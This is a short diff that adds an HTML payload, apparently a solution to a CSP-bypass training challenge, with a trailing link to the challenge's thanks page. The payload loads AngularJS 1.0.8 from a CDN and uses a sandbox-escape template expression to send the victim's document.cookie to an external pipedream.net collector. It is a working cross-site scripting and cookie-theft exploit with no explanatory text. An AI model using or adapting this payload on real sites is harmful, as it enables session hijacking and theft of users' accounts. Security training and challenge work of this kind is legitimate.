@@ -1,0 +1,10 @@
+<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
+<div ng-app ng-csp>
+{{ $eval.constructor("document.location='https://en9zemrvd4tib.x.pipedream.net/?'+document.cookie")() }}
+</div>
+
+
+
+
+
+https://csp.training.jinblack.it/thanks/f87b8478474b444db5440694222ffb0b
